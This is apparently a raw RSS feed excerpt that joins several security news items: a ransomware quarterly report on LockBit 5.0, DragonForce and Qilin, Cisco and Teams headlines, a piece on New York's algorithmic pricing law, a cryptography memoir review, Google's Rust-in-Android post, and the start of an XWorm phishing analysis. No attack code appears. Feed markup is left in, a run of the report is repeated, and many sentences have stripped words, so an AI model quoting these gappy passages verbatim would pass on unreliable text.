These findings illustrate the **limited long-term impact of law-enforcement operations** on the overall number of ransomware victims. Despite several high-profile takedowns during the past year—most of them directed at **large RaaS operations** such as **LockBit, 8Base, and Blacksuit**—the total volume of attacks did **not significantly decline**. Instead, the attacks continue a **gradual upward trend**, from an average of **approximately 420 victims per month in Q2–Q3 2024** to about **535 per month in the same period of 2025**.

This limited effect appears to stem from the **focus of enforcement efforts**: takedown operations primarily target **RaaS infrastructure and administrators**, which does not affect the **affiliate operators** who conduct the intrusions and drive the operational execution. When a major RaaS platform is disrupted, these affiliates typically **migrate to alternative programs or establish their own data-leak sites**, resulting in only short-term interruptions to overall activity levels.

The effects of **affiliate mobility** are evident both in the **proliferation of new leak sites** and in the **rising activity** of existing groups. **Qilin**, the most active actor in Q3 2025—and one of the most aggressive in recruiting former **RansomHub** affiliates—averaged around **75 victims per month**, up from **36 in Q1** prior to RansomHub’s closure in April. **INC Ransomware** increased its monthly total from **23 to 39** victims, and **Play** went from **28 to 33** during the same period.

This **ongoing fragmentation of the ecosystem** may further erode ransomware operators’ reliability. Victims traditionally rely on attackers reputation to supply decryption keys after payment. Large RaaS brands have a commercial incentive to maintain credibility and provide the keys, but smaller, short-lived groups do not, leading to reduced payment rates which are currently estimated at **25–40% of total attacks**.

In this context, the re-centralization of affiliates around major, recognizable brands remains strategically significant. Large RaaS programs preserve their market advantage through **stability, reputation, and structured affiliate infrastructure**. The **re-emergence of LockBit**, discussed in the following section, may represent precisely such a re-consolidation of affiliates under a **stable and trusted brand identity**.

_Figure 2 – Ransomware Groups by Publicly Claimed Victims – Q3 2025._

Qilin, Akira, INC Ransom, Play, and Safepay maintained their positions among the most active groups in Q3. Warlock and The Gentlemen emerged more recently, both demonstrating rapid early activity: Warlock began posting victims in June 2025 and reached 43 total listings in Q3, while The Gentlemen claimed 38 victims during a single month of operation in September 2025.

Until its disruption during Operation Cronos in early 2024, LockBit dominated the RaaS ecosystem, accounting for 20–30% of all published victims. Following the takedown, several arrests were announced, and successor groups — first RansomHub, then Qilin — attempted to inherit its affiliate base. However, the group’s core administrator, known as LockBitSupp, was never apprehended and in underground forums continued to hint at an eventual comeback.

The release of LockBit 5.0 in September 2025 marks the group’s return to active operations, reigniting questions about whether the RaaS landscape may again consolidate around this long-standing brand.

_Figure 3 – LockBit’s share of all DLS-published victims._

LockBit had long promised a comeback. In May 2025, following the latest in a series of public setbacks, the group’s administrator, LockBitSupp, responded on the RAMP underground forum, declaring that they would _“always rise up after being hacked.”_

_Figure 4 – LockBit administrator vowing to return on the RAMP forum._

_Figure 5 – LockBit administrator announcing the group’s return on RAMP chat._

The XSS Russian-language cybercriminal forum previously banned LockBitSupp following a dispute with another user and reaffirmed that “explicit advertising of RaaS will remain prohibited.” RaaS programs depend on affiliate recruitment for their business model and maintaining visibility on prominent criminal forums such as XSS or RAMP is essential to their work.

By early September, the XSS administrator reported that LockBitSupp requested to be reinstated and opened the decision to a community vote.

_Figure 6 – XSS forum administrator polling members on whether to reinstate LockBitSupp._

Despite this effort, the vote ultimately failed, and LockBit remains banned from XSS.

_Figure 7 – Voting results on LockBitSupp’s proposed return to XSS._

In early September 2025, LockBit announced on RAMP the official launch of LockBit 5.0, coinciding with the sixth anniversary of the operation. New affiliates were asked to provide a Bitcoin deposit of roughly US $500 for access to a new encryptor and an updated control panel.

_Figure_ _8_ _– LockBit 5.0 affiliate registration screen._

Since that announcement, we identified more than 15 distinct victims affected by LockBit 5.0, which replaced the earlier 4.0 builds that were still active until April 2025. LockBit continues to enforce strict operational security: all affiliate interfaces require individualized credentials, and no victims have been publicly listed on the group’s data-leak site.

_Figure_ _9_ _– LockBit 5.0 ransom note from an attack in mid-September 2025_

Updated ransom notes now explicitly identify themselves as “LockBit 5.0” and include a unique personal identifier that allows each victim to access a private negotiation portal. Victims are typically granted a 30-day grace period before the stolen data is published.

_Figure_ _10_ _– Screenshot of LockBit 5.0 negotiations with a victim, mid-September 2025._

Analysis of the initial campaign shows that approximately 65 percent of identified attacks targeted organizations in the United States, with the remainder affecting Mexico, Indonesia, and several European countries.

LockBit 5.0 represents an upgraded evolution of the previous 4.0 version, incorporating Windows, Linux, and ESXi variants. The new build introduces enhanced evasion and anti-analysis mechanisms, faster encryption routines, and the use of a randomized 16-character file extension to disrupt signature-based detection. Most confirmed infections were deployed on Windows systems, while roughly 20 percent targeted ESXi virtual infrastructure.

Historically, LockBit has been among the most active and disruptive RaaS programs. With its extensive experience and the lower entry barrier for new affiliates, the re-emergence of the group poses a renewed risk to organizations across many sectors. The actions observed in September likely represent only the leading edge of a larger campaign, and the October victim postings on LockBit’s data-leak site are expected to confirm its full operational return.

DragonForce distinguishes itself among emerging ransomware groups through its heavy emphasis on public relations and coalition branding, frequently issuing high-profile statements and partnership claims on criminal forums. In September 2025, it announced on RAMP a supposed “coalition” with Qilin and LockBit, presented as a unified affiliate initiative.

However, these declarations appear largely symbolic, with no verified evidence of shared infrastructure or joint operations. The announcements likely serve to attract affiliates and project influence within a fragmented RaaS market. This reflects DragonForce’s broader strategy to maintain visibility and credibility in an increasingly competitive underground ecosystem.

_Figure_ _11_ _– DragonForce announcing updates and coalition with LockBit and Qilin._

DragonForce roughly tripled its monthly victim count since the shutdown of RansomHub and claimed 56 victims in Q3 2025. This is still fewer than Qilin and Akira but shows steady growth. DragonForce continues to actively recruit affiliates and promote new features in its RaaS program and recently announced on RAMP a data-driven extortion service that offers affiliates tailored analysis of stolen data to maximize ransom leverage.

_Figure_ _12_ _– DragonForce’s “data audit” services._

Under this model, an affiliate that accessed a large dataset (typically over 300 GB) from a company with annual revenues above US $15 million can submit it for analysis and maximize the extortion impact. In a recent showcased example, DragonForce reviewed stolen files from a gold mining company and highlighted the most valuable commercial and financial information, accompanied by a customized extortion letter.

_Figure_ _13_ _– DragonForce Audit example._

Qilin remains the most active ransomware group in 2025, increasing its monthly victim rate to an average of 75 victims in Q3, up from 36 in Q1.

Although the group presents itself as ideologically motivated, its operations appear entirely financially driven. In a June 2024 interview published on its WikiLeaksV2 blog, Qilin’s operators described themselves as “idealists who love our country.” This statement, however, contrasts sharply with the group’s broad and opportunistic targeting across sectors and geographies.

_Figure_ _14_ _– Qilin interview from June 2024 on their official blog._

In a separate interview on SuspectFile, a Qilin affiliate characterized the program as profit-focused and flexible, with affiliates responsible for intrusion and exfiltration while Qilin manages infrastructure, leak-site operations, and negotiations. Reported affiliate share ranges between 80% and 85%, which is among the highest in the market. This has attracted numerous operators previously active under RansomHub and BianLian.

Qilin’s open affiliate framework accommodates actors with diverse motivations and capabilities. In one recent case, the group’s data-leak site briefly listed Israel’s Shamir Medical Center among its victims.

_Figure_ _15_ _– Shamir Medical Center announcement on Qilin’s DLS._

According to Israeli researcher Erez Dassa, the responsible affiliate was likely an Iranian-linked threat actor. Dassa reported that following direct communication, Qilin’s administrators agreed that public association with terrorism or politically motivated activity could expose the group to additional pressure and subsequently removed the listing.

_Figure 16- Erez Dassa’s Telegram post explaining the Shamir incident._

This incident illustrates the range of motivations operating within large RaaS ecosystems. While affiliates enjoy broad autonomy, Qilin demonstrates a degree of central oversight and reputational management, removing politically sensitive cases that may jeopardize its long-term operations. The group continues to balance open recruitment and strategic control, maintaining its position as a leading and resilient RaaS brand.]]></content:encoded></item><item><title>The State of Ransomware – Q3 2025</title><link>https://research.checkpoint.com/2025/the-state-of-ransomware-q3-2025/</link><author>samanthar@checkpoint.com</author><category>threatintel</category><pubDate>Thu, 13 Nov 2025 14:33:49 +0000</pubDate><source url="https://research.checkpoint.com/">Check Point Research</source><content:encoded><![CDATA[Record fragmentation and decentralization: The number of active extortion groups in Q3 2025 rose to a record of 85 groups, the highest number observed to date.

Victims are typically granted a 30-day grace period before the stolen data is published. – Screenshot of LockBit 5.0 negotiations with a victim, mid-September 2025.Analysis of the initial campaign shows that approximately 65 percent of identified attacks targeted organizations in the United States, with the remainder affecting Mexico, Indonesia, and several European countries.LockBit 5.0 represents an upgraded evolution of the previous 4.0 version, incorporating Windows, Linux, and ESXi variants. The new build introduces enhanced evasion and anti-analysis mechanisms, faster encryption routines, and the use of a randomized 16-character file extension to disrupt signature-based detection. Most confirmed infections were deployed on Windows systems, while roughly 20 percent targeted ESXi virtual infrastructure.Historically, LockBit has been among the most active and disruptive RaaS programs. With its extensive experience and the lower entry barrier for new affiliates, the re-emergence of the group poses a renewed risk to organizations across many sectors. The actions observed in September likely represent only the leading edge of a larger campaign, and the October victim postings on LockBit’s data-leak site are expected to confirm its full operational return.DragonForce’s marketing effortsDragonForce distinguishes itself among emerging ransomware groups through its heavy emphasis on public relations and coalition branding, frequently issuing high-profile statements and partnership claims on criminal forums. In September 2025, it announced on RAMP a supposed “coalition” with Qilin and LockBit, presented as a unified affiliate initiative.However, these declarations appear largely symbolic, with no verified evidence of shared infrastructure or joint operations. The announcements likely serve to attract affiliates and project influence within a fragmented RaaS market. This reflects DragonForce’s broader strategy to maintain visibility and credibility in an increasingly competitive underground ecosystem. – DragonForce announcing updates and coalition with LockBit and Qilin.DragonForce roughly tripled its monthly victim count since the shutdown of RansomHub and claimed 56 victims in Q3 2025. This is still fewer than Qilin and Akira but shows steady growth. DragonForce continues to actively recruit affiliates and promote new features in its RaaS program and recently announced on RAMP a data-driven extortion service that offers affiliates tailored analysis of stolen data to maximize ransom leverage. – DragonForce’s “data audit” services.Under this model, an affiliate that accessed a large dataset (typically over 300 GB) from a company with annual revenues above US $15 million can submit it for analysis and maximize the extortion impact. In a recent showcased example, DragonForce reviewed stolen files from a gold mining company and highlighted the most valuable commercial and financial information, accompanied by a customized extortion letter. – DragonForce Audit example.Qilin – The Dominant RaaS Operation of 2025Qilin remains the most active ransomware group in 2025, increasing its monthly victim rate to an average of 75 victims in Q3, up from 36 in Q1.Although the group presents itself as ideologically motivated, its operations appear entirely financially driven. In a June 2024 interview published on its WikiLeaksV2 blog, Qilin’s operators described themselves as “idealists who love our country.” This statement, however, contrasts sharply with the group’s broad and opportunistic targeting across sectors and geographies. – Qilin interview from June 2024 on their official blog.In a separate interview on SuspectFile, a Qilin affiliate characterized the program as profit-focused and flexible, with affiliates responsible for intrusion and exfiltration while Qilin manages infrastructure, leak-site operations, and negotiations. Reported affiliate share ranges between 80% and 85%, which is among the highest in the market. This has attracted numerous operators previously active under RansomHub and BianLian.Qilin’s open affiliate framework accommodates actors with diverse motivations and capabilities. In one recent case, the group’s data-leak site briefly listed Israel’s Shamir Medical Center among its victims. – Shamir Medical Center announcement on Qilin’s DLS.According to Israeli researcher Erez Dassa, the responsible affiliate was likely an Iranian-linked threat actor. Dassa reported that following direct communication, Qilin’s administrators agreed that public association with terrorism or politically motivated activity could expose the group to additional pressure and subsequently removed the listing.Figure 16- Erez Dassa’s Telegram post explaining the Shamir incident.This incident illustrates the range of motivations operating within large RaaS ecosystems. While affiliates enjoy broad autonomy, Qilin demonstrates a degree of central oversight and reputational management, removing politically sensitive cases that may jeopardize its long-term operations. The group continues to balance open recruitment and strategic control, maintaining its position as a leading and resilient RaaS brand.Geographic Distribution of Victims – Q3 2025The geographic distribution of ransomware victims in Q3 2025 continues to follow established trends in the global ransomware ecosystem. The United States accounted for roughly half of all reported cases, reaffirming its position as the primary target for financially motivated threat actors. Most publicly listed victims remain concentrated in Western, developed economies, where organizations are perceived as having greater financial resources and a higher likelihood of paying ransom.Figure 14- Publicly Claimed Victims by Countries, Q3 2025.An unusual concentration of attacks in South Korea elevated the country to seventh place on the list of most affected nations this quarter. This spike is linked almost entirely to Qilin, which listed 30 South Korean victims, 28 of them between August and September 2025. Of these, 23 belonged to the financial services sector. While the cause of this focused campaign remains uncertain, the Korea Herald newspaper attributed it to a compromised cloud server operated by an IT contractor serving multiple mid-sized private equity funds.Safepay maintained a strong focus on Germany and the United Kingdom, with each accounting for approximately 10% of its total victims in Q3. Together with INC Ransom, which also recorded 11 British victims, these two groups were the most active in the UK, followed closely by Qilin with 10.Twenty percent of DragonForce’s victims were based in Germany, making it the most active ransomware group in the country.INC Ransom reported a notably high proportion of Canadian victims (8%), the largest share of any group targeting Canadian organizations this quarter.Figure 15- Canadian Victims by Actor, Q3 2025.Ransomware Attacks by Industry – Q3 2025 AnalysisThe industry distribution of ransomware victims in Q3 2025 shows a consistent cross-sector impact, largely unchanged from previous quarters. Profit-oriented organizations with high downtime costs, such as industrial manufacturing, and those holding sensitive or regulated data, such as business services, remained the most targeted sectors, each representing approximately 10% of all extortion attempts.Healthcare and medical organizations continue to face steady targeting due to the critical nature of their operations and the sensitivity of stored information. Interestingly, threat actors view these victims as high-risk targets because of the attention such incidents attract from law enforcement. In Q2 2025, healthcare accounted for approximately 8% of all publicly listed victims, a figure that remained stable through Q3.While some groups, such as Play Ransomware, appear to enforce an internal policy against attacking healthcare institutions, others such as Qilin, INC Ransomware, and KillSec continue to list healthcare providers among their victims, disregarding the informal ethical boundaries observed by larger RaaS brands. – Ransomware Victims by Industry, Q3 2025.The ransomware ecosystem in  remains highly active and structurally fragmented, while at the same time increasingly adaptive. The dissolution of major RaaS programs did not reduce the overall volume of attacks but instead  among numerous smaller and more agile actors. Groups such as  and  have capitalized on this trend, expanding through aggressive affiliate recruitment and service innovation.  signals a potential trend toward  around trusted brands.Despite periodic law-enforcement disruptions, the fundamental dynamics of the ransomware market, using affiliate-driven operations, data extortion models, and cross-platform tooling, remain intact. Continued monitoring of affiliate migration patterns and emerging extortion techniques are essential to understanding how this decentralized ecosystem evolves through the remainder of 2025.]]></content:encoded></item><item><title>Microsoft rolls out screen capture prevention for Teams users</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-rolls-out-screen-capture-prevention-for-teams-users/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 13 Nov 2025 13:50:58 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft is rolling out a new Teams feature for Premium customers that will automatically block screenshots and recordings during meetings.

Think again. Your price might be different based on everything from your location to what you’ve looked at online. Companies often use algorithms to set their prices that rely heavily on customers’ personal data. Now, the state of New York is forcing companies to come clean when they set prices using customer data.Anyone using algorithms to adjust pricing for people in the state must now reveal when they’re doing it, thanks to legislation that the state began enforcing this week called the Algorithmic Pricing Disclosure Act.Algorithmic pricing is also known as “surveillance pricing” because it relies on using a person’s personal data to offer them promotional pricing (or potentially higher prices, if the vendor thinks they’ll pay).How software algorithms affect the prices you seeThe Federal Trade Commission (FTC) warned about this in a report that it released in January this year. It had ordered eight companies (Mastercard, Revionics, Bloomreach, JPMorgan Chase, Task Software, PROS, Accenture, and McKinsey) to disclose the services they offer that use algorithms and consumer data to set or recommend individualized prices, as well as the data inputs, customer lists and potential impact on consumer pricing. From the report:“A tool could be used to collect real-time information about a person’s browsing and transaction history and enable a company to offer—or not offer—promotions based on that consumer’s perceived affinity.” This data could include where they are, who they are, what they’re doing, and what they’ve done in the past. The report suggests that companies could use a wide variety of customer data to achieve these goals, including everything from their geolocation to what they’ve looked at on a particular website.For example, lingering over a particular item with their mouse or watching a certain percentage of a video on a website might alert companies that a consumer has a particular interest.The same data could be used to create “buckets” of customers with similar profiles (called “segments” in marketing) that companies could use to target people with different pricing.The FTC report had to use hypothetical examples, following push-back from the companies involved, but what it revealed was enlightening. A company might jack up prices of baby formula offered to a parent found searching for fast delivery, it said.In another imagined case, a person visiting a car dealership and using an in-store kiosk to explore vehicles might be segmented as a first-time car buyer, the report said. The store might decide that they’re inexperienced about the financing options available, affecting the rates that they’re offered.The FTC had issued a Request for Information (RFI) on the report, asking people for their own experiences of surveillance pricing. The public comment period was supposed to run until April 17, but the new FTC chair under the Trump administration, Andrew Ferguson, closed the RFI less than a week after the previous chair, Lina Khan, issued it.Last week the state’s Attorney General, Letitia James, effectively re-opened it—at least for New York residents. She issued a consumer alert urging residents to help enforce the law, which threatens a $1,000 penalty each time a company violates it. The alert encouraged people to report companies they believe are using algorithms to determine pricing.Under the New York law, businesses must display the exact text: “This price was set by an algorithm using your personal data.” They must display the text near the price shown, and they can’t use “protected class data” that is legally shielded from discrimination under the law. That includes ethnicity, national origin, disability, age, sex, sexual orientation, or gender identity. There are exceptions: insurance companies and other financial institutions are exempt under the Gramm-Leach-Bliley Act.A long history of algorithmic pricingAlgorithmic pricing has been happening for years. For example, in 2013 Staples was found to be adjusting prices for different people according to their distance from a rival’s store. The retailer reportedly charged higher prices for households with lower incomes, although whether this was intentional or just an unintended by-product of the algorithm isn’t clear. That’s the problem though: algorithms can easily have unexpected results.This pushback against surveillance pricing is spreading. California’s AB 325 bill amends the state’s Cartwright Act antitrust law to ban shared pricing algorithms that use competitor data between multiple businesses. Governor Gavin Newsom signed that into law last month, and it will take effect on January 1, 2026. He also passed SB 763, which increases civil and criminal penalties for violations of the Cartwright Act.Cybersecurity risks should never spread beyond a headline.

Nobody knew anything. The manufacturers didn’t know whether the cryptography they sold was any good. The customers didn’t know whether the crypto they bought was any good. Everyone pretended to know, thought they knew, or knew better than to even try to know. is the self-published memoirs of Fred Kinch. He was founder and vice president of—mostly sales—at a US cryptographic hardware company called Datotek, from company’s founding in 1969 until 1982. It’s mostly a disjointed collection of stories about the difficulties of selling to governments worldwide, along with descriptions of the highs and (mostly) lows of foreign airlines, foreign hotels, and foreign travel in general. But it’s also about encryption.Datotek sold cryptographic equipment in the era after rotor machines and before modern academic cryptography. The company initially marketed computer-file encryption, but pivoted to link encryption—low-speed data, voice, fax—because that’s what the market wanted.These were the years where the NSA hired anyone promising in the field, and routinely classified—and thereby blocked—publication of academic mathematics papers of those they didn’t hire. They controlled the fielding of strong cryptography by aggressively using the International Traffic in Arms regulation. Kinch talks about the difficulties in getting an expert license for Datotek’s products; he didn’t know that the only reason he ever got that license was because the NSA was able to break his company’s stuff. He had no idea that his largest competitor, the Swiss company Crypto AG, was owned and controlled by the CIA and its West German equivalent. “Wouldn’t that have made our life easier if we had known that back in the 1970s?” Yes, it would. But no one knew.Glimmers of the clandestine world peek out of the book. Countries like France ask detailed tech questions, borrow or buy a couple of units for “evaluation,” and then disappear again. Did they break the encryption? Did they just want to see what their adversaries were using? No one at Datotek knew.Kinch “carried the key generator logic diagrams and schematics” with him—even today, it’s good practice not to rely on their secrecy for security—but the details seem laughably insecure: four linear shift registers of 29, 23, 13, and 7 bits, variable stepping, and a small nonlinear final transformation. The NSA probably used this as a challenge to its new hires. But Datotek didn’t know that, at the time.Kinch writes: “The strength of the cryptography had to be accepted on trust and only on trust.” Yes, but it’s so, so weird to read about it in practice. Kinch demonstrated the security of his telephone encryptors by hooking a pair of them up and having people listen to the encrypted voice. It’s rather like demonstrating the safety of a food additive by showing that someone doesn’t immediately fall over dead after eating it. (In one absolutely bizarre anecdote, an Argentine sergeant with a “hearing defect” could understand the scrambled analog voice. Datotek fixed its security, but only offered the upgrade to the Argentines, because no one else complained. As I said, no one knew anything.)In his postscript, he writes that even if the NSA could break Datotek’s products, they were “vastly superior to what [his customers] had used previously.” Given that the previous devices were electromechanical rotor machines, and that his primary competition was a CIA-run operation, he’s probably right. But even today, we know nothing about any other country’s cryptanalytic capabilities during those decades.A lot of this book has a “you had to be there” vibe. And it’s mostly tone-deaf. There is no real acknowledgment of the human-rights-abusing countries on Datotek’s customer list, and how their products might have assisted those governments. But it’s a fascinating artifact of an era before commercial cryptography went mainstream, before academic cryptography became approved for US classified data, before those of us outside the triple fences of the NSA understood the mathematics of cryptography.This book review originally appeared in AFIO.]]></content:encoded></item><item><title>CISA warns feds to fully patch actively exploited Cisco flaws</title><link>https://www.bleepingcomputer.com/news/security/cisa-warns-feds-to-fully-patch-actively-exploited-cisco-flaws/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 13 Nov 2025 12:05:55 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[CISA warned federal agencies to fully patch two actively exploited vulnerabilities in Cisco Adaptive Security Appliances (ASA) and Firepower devices.

This year we look at how this approach isn’t just fixing things, but helping us move faster.

The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vulnerabilities for the first time.
Updated data for 2025. This data covers first-party and third-party (open source) code changes to the Android platform across C, C++, Java, Kotlin, and Rust. This post is published a couple of months before the end of 2025, but Android’s industry-standard 90-day patch window means that these results are very likely close to final. We can and will accelerate patching when necessary.
We adopted Rust for its security and are seeing a 1000x reduction in memory safety vulnerability density compared to Android’s C and C++ code. But the biggest surprise was Rust's impact on software delivery. With Rust changes having  and spending 25% less time in code review, the safer path is now also the faster one. 

In this post, we dig into the data behind this shift and also cover:
How we’re expanding our reach: We're pushing to make secure code the default across our entire software stack. We have updates on Rust adoption in first-party apps, the Linux kernel, and firmware.Our first rust memory safety vulnerability...almost: We'll analyze a near-miss memory safety bug in unsafe Rust: how it happened, how it was mitigated, and steps we're taking to prevent recurrence. It’s also a good chance to answer the question “if Rust can have memory safety issues, why bother at all?”
Developing an operating system requires the low-level control and predictability of systems programming languages like C, C++, and Rust. While Java and Kotlin are important for Android platform development, their role is complementary to the systems languages rather than interchangeable. We introduced Rust into Android as a direct alternative to C and C++, offering a similar level of control but without many of their risks. We focus this analysis on new and actively developed code because our data shows this to be an effective approach.

When we look at development in systems languages (excluding Java and Kotlin), two trends emerge: a steep rise in Rust usage and a slower but steady decline in new C++.
Net lines of code added: Rust vs. C++, first-party Android code.This chart focuses on first-party (Google-developed) code (unlike the previous chart that included all first-party and third-party code in Android.) We only include systems languages, C/C++ (which is primarily C++), and Rust.
The chart shows that the volume of new Rust code now rivals that of C++, enabling reliable comparisons of software development process metrics. To measure this, we use the DORA framework, a decade-long research program that has become the industry standard for evaluating software engineering team performance. DORA metrics focus on:
Throughput: the velocity of delivering software changes.Stability: the quality of those changes.
Cross-language comparisons can be challenging. We use several techniques to ensure the comparisons are reliable.
Similar sized changes: Rust and C++ have similar functionality density, though Rust is slightly denser. This difference favors C++, but the comparison is still valid. We use Gerrit’s change size definitions.Similar developer pools: We only consider first-party changes from Android platform developers. Most are software engineers at Google, and there is considerable overlap between pools with many contributing in both.Track trends over time: As Rust adoption increases, are metrics changing steadily, accelerating the pace, or reverting to the mean? 
Code review is a time-consuming and high-latency part of the development process. Reworking code is a primary source of these costly delays. Data shows that Rust code requires fewer revisions. This trend has been consistent since 2023. Rust changes of a similar size need about 20% fewer revisions than their C++ counterparts.

In addition, Rust changes currently spend about 25% less time in code review compared to C++. We speculate that the significant change in favor of Rust between 2023 and 2024 is due to increased Rust expertise on the Android team.

While less rework and faster code reviews offer modest productivity gains, the most significant improvements are in the stability and quality of the changes.

Stable and high-quality changes differentiate Rust. DORA uses rollback rate for evaluating change stability. Rust's rollback rate is very low and continues to decrease, even as its adoption in Android surpasses C++.
For medium and large changes, the rollback rate of Rust changes in Android is ~4x lower than C++. This low rollback rate doesn't just indicate stability; it actively improves overall development throughput. Rollbacks are highly disruptive to productivity, introducing organizational friction and mobilizing resources far beyond the developer who submitted the faulty change. Rollbacks necessitate rework and more code reviews, can also lead to build respins, postmortems, and blockage of other teams. Resulting postmortems often introduce new safeguards that add even more development overhead.
In a self-reported survey from 2022, Google software engineers reported that Rust is both easier to review and more likely to be correct. The hard data on rollback rates and review times validates those impressions.

Historically, security improvements often came at a cost. More security meant more process, slower performance, or delayed features, forcing trade-offs between security and other product goals. The shift to Rust is different: we are significantly improving security  key development efficiency and product stability metrics. 

With Rust support now mature for building Android system services and libraries, we are focused on bringing its security and productivity advantages elsewhere. 
First-party applications: Rust is ensuring memory safety from the ground up in several security-critical Google applications, such as:Nearby Presence: The protocol for securely and privately discovering local devices over Bluetooth is implemented in Rust and is currently running in Google Play Services.MLS: The protocol for secure RCS messaging is implemented in Rust and will be included in the Google Messages app in a future release.Chromium: Parsers for PNG, JSON, and web fonts have been replaced with memory-safe implementations in Rust, making it easier for Chromium engineers to deal with data from the web while following the Rule of 2.These examples highlight Rust's role in reducing security risks, but memory-safe languages are only one part of a comprehensive memory safety strategy. We continue to employ a defense-in-depth approach, the value of which was clearly demonstrated in a recent near-miss.

We recently avoided shipping our very first Rust-based memory safety vulnerability: a linear buffer overflow in CrabbyAVIF. It was a near-miss. To ensure the patch received high priority and was tracked through release channels, we assigned it the identifier CVE-2025-48530. While it’s great that the vulnerability never made it into a public release, the near-miss offers valuable lessons. The following sections highlight key takeaways from our postmortem.
Scudo Hardened Allocator for the Win
A key finding is that Android’s Scudo hardened allocator deterministically rendered this vulnerability non-exploitabledue to guard pages surrounding secondary allocations. While Scudo is Android’s default allocator, used on Google Pixel and many other devices, we continue to work with partners to make it mandatory. In the meantime, we will issue CVEs of sufficient severity for vulnerabilities that could be prevented by Scudo.

In addition to protecting against overflows, Scudo’s use of guard pages helped identify this issue by changing an overflow from silent memory corruption into a noisy crash. However, we did discover a gap in our crash reporting: it failed to clearly show that the crash was a result of an overflow, which slowed down triage and response. This has been fixed, and we now have a clear signal when overflows occur into Scudo guard pages.
Unsafe Review and Training
Operating system development requires unsafe code, typically C, C++, or unsafe Rust  (for example, for FFI and interacting with hardware), so simply banning unsafe code is not workable. When developers must use unsafe, they should understand how to do so soundly and responsibly

To that end, we are adding a new deep dive on unsafe code to our Comprehensive Rust training. This new module, currently in development, aims to teach developers how to reason about unsafe Rust code, soundness and undefined behavior, as well as best practices like safety comments and encapsulating unsafe code in safe abstractions.

Better understanding of unsafe Rust will lead to even higher quality and more secure code across the open source software ecosystem and within Android. As we'll discuss in the next section, our unsafe Rust is already really quite safe. It’s exciting to consider just how high the bar can go.

This near-miss inevitably raises the question: "If Rust can have memory safety vulnerabilities, then what’s the point?"

The point is that the density is drastically lower. So much lower that it represents a major shift in security posture. Based on our near-miss, we can make a conservative estimate. With roughly 5 million lines of Rust in the Android platform and one potential memory safety vulnerability found (and fixed pre-release), our estimated vulnerability density for Rust is 0.2 vuln per 1 million lines (MLOC).

Our historical data for C and C++ shows a density of closer to 1,000 memory safety vulnerabilities per MLOC. Our Rust code is currently tracking at a density orders of magnitude lower: a more than 1000x reduction.
Memory safety rightfully receives significant focus because the vulnerability class is uniquely powerful and (historically) highly prevalent. High vulnerability density undermines otherwise solid security design because these flaws can be chained to bypass defenses, including those specifically targeting memory safety exploits. Significantly lowering vulnerability density does not just reduce the number of bugs; it dramatically boosts the effectiveness of our entire security architecture.

The primary security concern regarding Rust generally centers on the approximately 4% of code written within  blocks. This subset of Rust has fueled significant speculation, misconceptions, and even theories that unsafe Rust might be more buggy than C. Empirical evidence shows this to be quite wrong.

Our data indicates that even a more conservative assumption, that a line of unsafe Rust is as likely to have a bug as a line of C or C++, significantly overestimates the risk of unsafe Rust. We don’t know for sure why this is the case, but there are likely several contributing factors:
unsafe{} doesn't actually disable all or even most of Rust’s safety checks (a common misconception).The practice of encapsulation enables local reasoning about safety invariants.The additional scrutiny that unsafe{} blocks receive.
Historically, we had to accept a trade-off: mitigating the risks of memory safety defects required substantial investments in static analysis, runtime mitigations, sandboxing, and reactive patching. This approach attempted to move fast and then pick up the pieces afterwards. These layered protections were essential, but they came at a high cost to performance and developer productivity, while still providing insufficient assurance.

While C and C++ will persist, and both software and hardware safety mechanisms remain critical for layered defense, the transition to Rust is a different approach where the more secure path is also demonstrably more efficient. Instead of moving fast and  later fixing the mess, we can move faster  fixing things. And who knows, as our code gets increasingly safe, perhaps we can start to reclaim even more of that performance and productivity that we exchanged for security, all while also  security.

Good instinct—it was, and what we found inside was a surprisingly old trick hiding a modern threat.If the recipient had opened the attached Visual Basic Script () file, it would have quietly installed a remote-access Trojan known as Backdoor.XWorm. Once active, it could have let attackers:Steal files, passwords and other personal dataInstall other malware, including ransomwareEverything happens silently, with no alerts or windows. It’s built to avoid antivirus tools and hand over complete control of the PC.Please find attached the list of invoices we have processed and payment has been made as of 8/1/2025 2:45:06 a.m.Kindly review and confirm that these have been received on your end.Additionally, we would appreciate it if you could send us an updated list of any outstanding or unpaid invoices for our records.Looking forward to your response.The payload was identified by our research team as . XWorm is a known remote-access trojan (RAT) and backdoor used for spying, keylogging, stealing data, and even installing ransomware. It is sold as malware-as-a-service (MaaS), which means cybercriminals sell (or more often, rent) it to other criminals, who can then distribute and deploy it as they see fit while using the MaaS provider’s infrastructure to receive stolen data and maintain access through the backdoor.Why this email was suspiciousThe email itself had obvious warning signs: no names, just a generic “Hi” and a vague “Account Officer” signature. Real invoices or payment notices almost always include contact details, so this alone should raise suspicion.That attachment immediately stood out because  files are almost never used in business emails anymore. Visual Basic Script was a Windows automation tool from the late 1990s and 2000s—long since replaced by more versatile scripting languages like PowerShell.Today, almost every company blocks  attachments outright because they can execute code the moment you open them.So when one still gets through, it usually means either a security filter failed or an attacker deliberately tried to bypass it. In 2025, receiving a  “invoice” is like finding a floppy disk in your mailbox. It’s retro, suspicious, and definitely not something you should plug in.Double-check unexpected attachments: If you weren’t expecting it, confirm first using a known contact method, rather than by replying to the same email.Don’t open executable files: Anything ending in , , , or  can run code. Legitimate businesses don’t send these by email.I wanted to know exactly what that attachment did and how it worked. For our technical readers, here’s my deep dive down the wormhole.The message itself was straightforward—a short “invoice” note with a polite request to confirm payment and a  attachment named . Nothing about the text was overtly malicious, but the presence of a Visual Basic Script attachment immediately stood out. files are rarely, if ever, used in legitimate business correspondence anymore. Because they can execute code directly, most mail gateways block them outright. Seeing one arrive intact suggested either a configuration oversight or a deliberate attempt to bypass filtering.That alone made the sample worth a closer look.Using an Excel file with a malicious VBA macro often makes more sense from a criminal’s perspective than sending a plain  attachment. Excel files are common in business environments and can appear legitimate, making them less likely to raise suspicion than a raw script. Attackers also benefit because macro-enabled Office documents remain a frequent delivery mechanism. Many users and organisations still interact with these files and can be tricked into enabling macros for what seem like “legitimate” reasons.Microsoft has made macros harder to execute by default, so some threat actors have shifted tactics. Macros still work where social engineering succeeds, but attackers increasingly experiment with other vectors when they can’t 